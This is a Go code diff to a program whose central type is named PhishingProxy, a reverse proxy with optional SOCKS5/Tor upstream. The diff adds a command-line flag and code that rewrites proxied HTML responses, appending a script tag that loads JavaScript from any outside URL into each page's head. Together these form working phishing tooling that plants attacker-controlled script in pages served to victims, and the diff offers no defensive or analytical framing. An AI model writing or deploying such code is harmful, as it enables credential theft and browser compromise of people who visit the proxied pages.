@@ -2,7 +2,10 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"flag"
+	"fmt"
+	"io/ioutil"
 	"log"
 	"net"
 	"net/http"
@@ -12,6 +15,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/PuerkitoBio/goquery"
 	"golang.org/x/net/proxy"
 )
 
@@ -25,6 +29,7 @@ var (
 	address        = flag.String("address", "localhost:8080", "Address and port to run proxy service on. Format address:port.")
 	attachProfiler = flag.Bool("with-profiler", false, "Attach profiler to instance.")
 	proxyAddress   = flag.String("proxy", "", "Optional upstream SOCKS5 proxy. Useful for torification.")
+	javascriptURL  = flag.String("inject-js", "", "URL to a JavaScript file you want injected.")
 )
 
 // HTTPTransaction represents a complete request - response flow.
@@ -40,7 +45,7 @@ type ResponseTransformer interface {
 
 // JavaScriptInjectionTransformer holds JavaScript filename for injecting into response.
 type JavaScriptInjectionTransformer struct {
-	javascriptFileName string
+	javascriptURL string
 }
 
 // Transform Injects JavaScript into an HTML response.
@@ -49,6 +54,30 @@ func (j JavaScriptInjectionTransformer) Transform(response *http.Response) error
 		return nil
 	}
 
+	// Prevent NewDocumentFromReader from closing the response body.
+	responseText, err := ioutil.ReadAll(response.Body)
+	responseBuffer := bytes.NewBuffer(responseText)
+	response.Body = ioutil.NopCloser(responseBuffer)
+	if err != nil {
+		return err
+	}
+
+	document, err := goquery.NewDocumentFromReader(responseBuffer)
+	if err != nil {
+		return err
+	}
+
+	payload := fmt.Sprintf("<script type='text/javascript' src='%s'></script>", j.javascriptURL)
+	selection := document.
+		Find("head").
+		AppendHtml(payload).
+		Parent()
+
+	html, err := selection.Html()
+	if err != nil {
+		return err
+	}
+	response.Body = ioutil.NopCloser(bytes.NewBufferString(html))
 	return nil
 }
 
@@ -152,8 +181,9 @@ func main() {
 		client.Transport = httpTransport
 	}
 
-	responseTransformers := []ResponseTransformer{
-		JavaScriptInjectionTransformer{javascriptFileName: "script.js"},
+	responseTransformers := []ResponseTransformer{}
+	if *javascriptURL != "" {
+		responseTransformers = append(responseTransformers, JavaScriptInjectionTransformer{javascriptURL: *javascriptURL})
 	}
 
 	phishingProxy := &PhishingProxy{
